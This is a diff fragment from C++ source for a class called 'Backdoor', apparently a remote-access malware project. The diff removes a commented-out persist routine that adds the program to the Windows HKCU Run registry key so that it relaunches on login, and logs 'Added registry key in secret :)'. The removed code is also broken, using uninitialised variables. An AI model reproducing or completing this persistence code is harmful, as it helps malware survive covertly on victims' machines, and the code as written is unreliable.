@@ -143,32 +143,10 @@ void Backdoor::OnShellOpen(int argc, TCHAR *argv[])
       }
 }
 
-/*
-void Backdoor::persist(string *programName)
-{
-      char path[500];
-      int FirstLaunch;
-
-      strcat(path, "\\");
-      strcat(path, programName.c_str());
-
-      log("Checking..." + std::string(path) + "...");
-
-      if (FirstLaunch)
-      {
-            HKEY key;
-            RegOpenKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &key);
-            RegSetValueEx(key, programName.c_str(), 0, REG_SZ, (BYTE*)path, strlen(path));
-            log("> Added registry key in secret :)");
-      }
-}
-*/
-
 Backdoor* Backdoor::getInstance()
 {
       if (!instance) {
             instance = new Backdoor();
       }
-
       return instance;
 }
